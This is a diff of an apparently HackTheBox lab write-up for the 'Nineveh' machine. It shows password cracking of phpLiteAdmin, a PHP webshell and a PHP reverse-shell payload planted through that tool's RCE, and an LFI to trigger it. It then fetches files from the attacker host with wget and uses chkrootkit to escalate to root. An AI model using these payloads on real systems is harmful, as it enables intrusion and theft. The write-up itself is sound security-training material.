@@ -226,7 +226,7 @@ However I notice the notes page is getting the content from a parameter in the U
 ```
 http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
 ```
-This indicate a possible LFI vuln but I can't find any way to read files aside from the notes that is provided by the page. For now I'll move on with a plan to try and look at the source code for this app if I can get in through the phpLiteAdmin page.
+This indicate a possible LFI vuln but I can't find any way to read files aside from the notes that is provided by the page. It's possible there is filtering in place which prevents other files from being accessed.
 
 ### 4. Recover phpLiteAdmin login cred
 ```bash
@@ -242,7 +242,385 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-17 14:59:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-17 15:01:03
 ```
-The password for the admin panel is `password123`.
+The password for the admin panel is `password123`.  
+  
+When logging in, there is a single "test" database with no tables. Other information for this database:
+```
+Database name: test
+Path to database: /var/tmp/test
+Size of database: 1 KB
+Database last modified: 7:52pm on July 2, 2017
+SQLite version: 3.11.0
+SQLite extension [?]: PDO
+PHP version: 7.0.18-0ubuntu0.16.04.1
+```
 
-### 5. Attempt exploitation of phpLiteAdmin panel
+### 5. Get a shell
+phpLiteAdmin is subject to an RCE vulnerability, the details of which are (from https://www.exploit-db.com/exploits/24044):
+  
+*phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',
+An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.*
+  
+I can test the proof of concept, which runs the code displaying the PHP info page to test that it works. To access the file, I can set up a basic PHP webshell with the filename ninevehNotes.txt_shell.php and try to access it via the department page LFI.  
+Create the database:
+```
+Database name: ninevehNotes.txt_shell.php
+Path to database: /var/tmp/ninevehNotes.txt_shell.php
+Size of database: 1 KB
+Database last modified: 4:42am on December 18, 2020
+SQLite version: 3.11.0
+SQLite extension [?]: PDO
+PHP version: 7.0.18-0ubuntu0.16.04.1
+```
+Create table:
+```
+Table 'shell' has been created.
+CREATE TABLE 'shell' ('<?php if(isset($_REQUEST[''cmd''])){ echo "<pre>"; $cmd = ($_REQUEST[''cmd'']); system($cmd); echo "</pre>"; die; } ?>' TEXT)
+```
+When I try to use the LFI to read this file, I get an error:
+*Warning:  include(): Failed opening '/var/tmp/ninevehNotes.txt_shell.php?cmd=id' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31*  
+What I take this to mean is that although the file is now being accessed and executed, I can't pass params to it this way. So I guess I just have to go all in and use reverse shell code without params.
+```
+Query used to create this table
+CREATE TABLE 'shell' ('<?php $sock=fsockopen("10.10.14.162",9999);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' TEXT)
+```
+Access the file to run the code with my listener on, catch shell:
+```bash
+┌──(kali㉿kali)-[~/Desktop/htb/nineveh/utils]
+└─$ nc -lvnp 9999                   
+listening on [any] 9999 ...
+connect to [10.10.14.162] from (UNKNOWN) [10.129.64.187] 51314
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
 
+### 6. Enumerate from foothold
+First I can check out the code with the filtering (more out of interest than anything)
+```php
+www-data@nineveh:/var/www/html/department$ cat manage.php
+<?php 
+session_start();
+
+
+  if (!isset($_SESSION['username'])){
+      header("Location: login.php");
+      die();
+  } else {
+  require "header.php";
+?>
+
+<div class="row">
+  <div class="col-lg-12">
+      <?php if (isset($error)) { ?>
+          <span class="text text-danger"><b><?php echo $error; ?></b></span>
+      <?php } ?>
+    <h2>Hi <?php echo $_SESSION['username']; ?>,</h2>
+        <img src=./underconstruction.jpg alt="Under Construction!" style="width:800px;height:600px;"> <br>
+  </div>
+</div>
+<?php if(isset($_GET['notes'])){ ?>
+<pre>
+<?php
+  $file = @$_GET['notes'];
+  if(strlen($file) > 55)
+     exit("File name too long.");
+  $fileName = basename($file);
+  if(!strpos($file, "ninevehNotes"))
+    exit("No Note is selected.");
+  echo "<pre>";
+  include($file);
+  echo "</pre>";
+?>
+
+</pre> 
+
+<?php } ?>
+
+<?php
+  require "footer.php"; }
+?>
+```
+The code does indeed filter out any files that do not have "ninevehNotes" in the name.  
+Check running processes:
+```bash
+$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.5  37976  6008 ?        Ss   04:02   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    04:02   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    04:02   0:00 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   04:02   0:00 [kworker/0:0H]
+root         7  0.0  0.0      0     0 ?        S    04:02   0:00 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    04:02   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    04:02   0:00 [migration/0]
+root        10  0.0  0.0      0     0 ?        S    04:02   0:00 [watchdog/0]
+root        11  0.0  0.0      0     0 ?        S    04:02   0:00 [kdevtmpfs]
+root        12  0.0  0.0      0     0 ?        S<   04:02   0:00 [netns]
+root        13  0.0  0.0      0     0 ?        S<   04:02   0:00 [perf]
+root        14  0.0  0.0      0     0 ?        S    04:02   0:00 [khungtaskd]
+root        15  0.0  0.0      0     0 ?        S<   04:02   0:00 [writeback]
+root        16  0.0  0.0      0     0 ?        SN   04:02   0:00 [ksmd]
+root        17  0.0  0.0      0     0 ?        SN   04:02   0:00 [khugepaged]
+...
+root       279  0.0  0.0      0     0 ?        S<   04:02   0:00 [bioset]
+root       349  0.0  0.0      0     0 ?        S<   04:02   0:00 [raid5wq]
+root       384  0.0  0.0      0     0 ?        S<   04:02   0:00 [bioset]
+root       412  0.0  0.0      0     0 ?        S    04:02   0:00 [jbd2/sda1-8]
+root       413  0.0  0.0      0     0 ?        S<   04:02   0:00 [ext4-rsv-conver]
+root       455  0.0  0.0      0     0 ?        S<   04:02   0:00 [kworker/0:1H]
+root       480  0.0  0.2  28360  2716 ?        Ss   04:02   0:00 /lib/systemd/systemd-journald
+root       487  0.0  0.0      0     0 ?        S    04:02   0:00 [kauditd]
+root       497  0.0  0.0      0     0 ?        S<   04:02   0:00 [iscsi_eh]
+root       501  0.0  0.0      0     0 ?        S<   04:02   0:00 [ib_addr]
+root       503  0.0  0.1  94776  1612 ?        Ss   04:02   0:00 /sbin/lvmetad -f
+root       512  0.0  0.4  44572  4104 ?        Ss   04:02   0:00 /lib/systemd/systemd-udevd
+root       518  0.0  0.0      0     0 ?        S<   04:02   0:00 [ib_mcast]
+root       519  0.0  0.0      0     0 ?        S<   04:02   0:00 [ib_nl_sa_wq]
+root       522  0.0  0.0      0     0 ?        S<   04:02   0:00 [ib_cm]
+root       525  0.0  0.0      0     0 ?        S<   04:02   0:00 [iw_cm_wq]
+root       527  0.0  0.0      0     0 ?        S<   04:02   0:00 [rdma_cm]
+root       595  0.0  0.9 194416 10124 ?        Ssl  04:02   0:03 /usr/bin/vmtoolsd
+systemd+   619  0.0  0.2 100328  2600 ?        Ssl  04:02   0:00 /lib/systemd/systemd-timesyncd
+syslog     934  0.0  0.3 256404  3428 ?        Ssl  04:02   0:00 /usr/sbin/rsyslogd -n
+root       935  0.0  0.6 275772  6320 ?        Ssl  04:02   0:00 /usr/lib/accountsservice/accounts-daemon
+message+   937  0.0  0.3  42896  3820 ?        Ss   04:02   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root       952  0.0  0.3  29012  3100 ?        Ss   04:02   0:00 /usr/sbin/cron -f
+root       955  0.0  1.8 263820 18604 ?        Ssl  04:02   0:00 /usr/lib/snapd/snapd
+daemon     961  0.0  0.2  26048  2308 ?        Ss   04:02   0:00 /usr/sbin/atd -f
+root       970  0.4  0.6 629660  6176 ?        Ssl  04:02   0:20 /usr/bin/lxcfs /var/lib/lxcfs/
+root       971  0.0  0.9  85440  9204 ?        Ss   04:02   0:00 /usr/bin/VGAuthService
+root       972  0.0  0.1  20104  1136 ?        Ss   04:02   0:00 /lib/systemd/systemd-logind
+root       980  0.0  0.1   4404  1276 ?        Ss   04:02   0:00 /usr/sbin/acpid
+root      1010  0.0  0.5 277184  5968 ?        Ssl  04:02   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root      1025  0.0  0.0  13380   168 ?        Ss   04:02   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
+root      1166  0.0  0.2  16124  2756 ?        Ss   04:02   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens160.leases -I -df /var/lib/dhcp/dhclient6.ens160.leases ens160
+root      1318  0.0  0.5  65524  5296 ?        Ss   04:02   0:00 /usr/sbin/sshd -D
+root      1339  0.0  0.0   5228   156 ?        Ss   04:02   0:00 /sbin/iscsid
+root      1340  0.0  0.3   5728  3524 ?        S<Ls 04:02   0:00 /sbin/iscsid
+root      1415  0.0  0.1  15944  1824 tty1     Ss+  04:02   0:00 /sbin/agetty --noclear tty1 linux
+root      1435  0.0  2.5 270376 25940 ?        Ss   04:02   0:00 /usr/sbin/apache2 -k start
+www-data  1438  0.0  1.6 271056 16652 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
+www-data  1439  0.0  1.6 271072 17140 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
+www-data  1440  0.0  1.6 271384 17256 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
+www-data  1441  0.0  1.6 270936 17128 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
+www-data  1442  0.0  1.6 271000 17112 ?        S    04:02   0:00 /usr/sbin/apache2 -k start
+root      7242  0.0  0.0      0     0 ?        S    04:08   0:00 [kworker/0:0]
+root      7243  0.0  0.0      0     0 ?        S    04:08   0:00 [kworker/u2:0]
+www-data 15096  0.0  1.2 270844 12884 ?        S    04:50   0:00 /usr/sbin/apache2 -k start
+root     15894  0.0  0.0      0     0 ?        S    04:17   0:00 [kworker/0:1]
+www-data 16258  0.0  0.2  34428  2948 ?        R    05:25   0:00 ps aux
+www-data 19723  0.0  1.6 271460 17188 ?        S    04:21   0:00 /usr/sbin/apache2 -k start
+www-data 19724  0.0  1.7 271520 17640 ?        S    04:21   0:00 /usr/sbin/apache2 -k start
+www-data 19725  0.0  1.6 271060 16768 ?        S    04:21   0:00 /usr/sbin/apache2 -k start
+www-data 29460  0.0  0.0   4512   704 ?        S    05:05   0:00 sh -c /bin/sh -i
+www-data 29461  0.0  0.0   4512   712 ?        S    05:05   0:00 /bin/sh -i
+```
+Interestingly it looks like there is an ssh daemon running, despite there not being any SSH service externally available. There is also a user in the passwd file:
+```bash
+$ cat etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+```
+Additionally, I can see in amoris' directory, he has an .ssh directory with an authorized_keys file. At this point I figure I am looking for a way to enable external ssh access on the machine.
+
+### 7. Lateral movement
+
+First thing I try is seeing if I can SSH internally from www-data. Firstly I need to copy the private key to the machine.
+```bash
+www-data@nineveh:/tmp$ wget http://10.10.14.162:8000/nineveh.priv
+--2020-12-18 05:49:51--  http://10.10.14.162:8000/nineveh.priv
+Connecting to 10.10.14.162:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1675 (1.6K) [application/octet-stream]
+Saving to: 'nineveh.priv'
+
+nineveh.priv        100%[===================>]   1.64K  --.-KB/s    in 0.02s   
+
+2020-12-18 05:49:52 (74.2 KB/s) - 'nineveh.priv' saved [1675/1675]
+
+www-data@nineveh:/tmp$ chmod 600 nineveh.priv
+```
+Then login.
+```bash
+www-data@nineveh:/tmp$ ssh -i nineveh.priv amrois@localhost
+Could not create directory '/var/www/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
+Are you sure you want to continue connecting (yes/no)? yes
+yes
+Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
+Ubuntu 16.04.2 LTS
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+287 packages can be updated.
+206 updates are security updates.
+
+
+You have mail.
+Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
+amrois@nineveh:~$ whoami
+whoami
+amrois
+```
+
+### 8. Enumerate from user
+I start with some enumeration using linpeas (see linpeas_out.txt). When reading the output I noticed that there was a cron job running which called /usr/sbin/report-reset.sh.
+```
+*/10 * * * * /usr/sbin/report-reset.sh
+```
+The script is called every 10 minutes. Check out the contents:
+```bash
+amrois@nineveh:~$ cat /usr/sbin/report-reset.sh
+#!/bin/bash
+
+rm -rf /report/*.txt
+```
+It is removing .txt files from the /report directory. Let's now check out the contents of that directory:
+```bash
+eport-20-12-18:06:10.txt  report-20-12-18:06:11.txt  report-20-12-18:06:12.txt
+amrois@nineveh:/report$ cat * | head -n 100
+cat * | head -n 100
+ROOTDIR is `/'
+Checking `amd'... not found
+Checking `basename'... not infected
+Checking `biff'... not found
+Checking `chfn'... not infected
+...
+Checking `ldsopreload'... can't exec ./strings-static, not tested
+Checking `login'... not infected
+Checking `ls'... not infected
+Checking `lsof'... not infected
+Checking `mail'... not found
+Checking `mingetty'... not found
+Checking `netstat'... not infected
+Checking `named'... not found
+Checking `passwd'... not infected
+Checking `pidof'... not infected
+..
+Checking `tcpdump'... not infected
+Checking `top'... not infected
+Checking `telnetd'... not found
+Checking `timed'... not found
+Checking `traceroute'... not found
+Checking `vdir'... not infected
+Checking `w'... not infected
+Checking `write'... not infected
+Checking `aliens'... no suspect files
+Searching for sniffer's logs, it may take a while... nothing found
+Searching for HiDrootkit's default dir... nothing found
+Searching for t0rn's default files and dirs... nothing found
+Searching for t0rn's v8 defaults... nothing found
+Searching for Lion Worm default files and dirs... nothing found
+Searching for RSHA's default files and dir... nothing found
+Searching for RH-Sharpe's default files... nothing found
+Searching for Ambient's rootkit (ark) default files and dirs... nothing found
+Searching for suspicious files and dirs, it may take a while... 
+/lib/modules/4.4.0-62-generic/vdso/.build-id
+/lib/modules/4.4.0-62-generic/vdso/.build-id
+Searching for LPD Worm files and dirs... nothing found
+Searching for Ramen Worm files and dirs... nothing found
+Searching for Maniac files and dirs... nothing found
+Searching for RK17 files and dirs... nothing found
+Searching for Ducoci rootkit... nothing found
+Searching for Adore Worm... nothing found
+Searching for ShitC Worm... nothing found
+Searching for Omega Worm... nothing found
+Searching for Sadmind/IIS Worm... nothing found
+Searching for MonKit... nothing found
+Searching for Showtee... nothing found
+Searching for OpticKit... nothing found
+Searching for T.R.K... nothing found
+Searching for Mithra... nothing found
+Searching for LOC rootkit... nothing found
+Searching for Romanian rootkit... nothing found
+Searching for Suckit rootkit... Warning: /sbin/init INFECTED
+Searching for Volc rootkit... nothing found
+Searching for Gold2 rootkit... nothing found
+Searching for TC2 Worm default files and dirs... nothing found
+Searching for Anonoying rootkit default files and dirs... nothing found
+Searching for ZK rootkit default files and dirs... nothing found
+Searching for ShKit rootkit default files and dirs... nothing found
+Searching for AjaKit rootkit default files and dirs... nothing found
+Searching for zaRwT rootkit default files and dirs... nothing found
+Searching for Madalin rootkit default files... nothing found
+Searching for Fu rootkit default files... nothing found
+Searching for ESRK rootkit default files... nothing found
+Searching for rootedoor... nothing found
+Searching for ENYELKM rootkit default files... nothing found
+Searching for common ssh-scanners default files... nothing found
+```
+From this output, I take a string that I think might be unique: "Searching for suspicious files and dirs, it may take a while...", and google it. The results I get back are all to do with the chkrootkit application. I can verify that it exists, but I can't run it as I am not root.
+```bash
+amrois@nineveh:/report$ which chkrootkit
+/usr/bin/chkrootkit
+
+amrois@nineveh:/report$ chkrootkit -V
+/bin/sh: 0: Can't open /usr/bin/chkrootkit
+
+amrois@nineveh:/report$ ls -l /usr/bin/chkrootkit
+-rwx--x--x 1 root root 76181 Jul  2  2017 /usr/bin/chkrootkit
+```
+From previous experince doing a vulnhub machine (SickOS) I know there is a vulnerable version of chkrootkit that allows for RCE and privilege escalation. Without the version number there's no garuntee it will work, but yolo, there is no downside to attempting it.
+
+### 9. Escalate to root
+Create bash reverse shell script, then wget it to the machine and give it execute perms.
+```bash
+amrois@nineveh:/tmp$ wget http://10.10.14.162:8000/update && chmod +x update && echo "Done"
+<ttp://10.10.14.162:8000/update && chmod +x update && echo "Done"            
+--2020-12-18 06:24:28--  http://10.10.14.162:8000/update
+Connecting to 10.10.14.162:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 55 [application/octet-stream]
+Saving to: ‘update’
+
+update              100%[===================>]      55  --.-KB/s    in 0s      
+
+2020-12-18 06:24:28 (14.4 MB/s) - ‘update’ saved [55/55]
+
+Done
+```
+Wait a minute...
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 9998
+listening on [any] 9998 ...
+connect to [10.10.14.162] from (UNKNOWN) [10.129.64.187] 56706
+bash: cannot set terminal process group (25029): Inappropriate ioctl for device
+bash: no job control in this shell
+root@nineveh:~# whoami
+whoami
+root
+```
